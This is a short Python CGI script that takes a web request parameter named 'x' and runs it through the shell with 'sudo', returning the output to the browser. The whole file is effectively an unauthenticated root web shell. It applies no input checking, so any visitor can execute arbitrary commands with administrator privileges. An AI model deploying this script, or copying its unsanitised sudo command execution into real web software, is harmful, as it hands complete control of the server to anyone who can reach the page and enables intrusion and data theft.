#!/usr/bin/python3

import cgi
import subprocess


print("content-type: text/html")
print()

cmdinput = cgi.FieldStorage()
cmd = cmdinput.getvalue("x")
output = subprocess.getoutput("sudo " + cmd)
print(output)
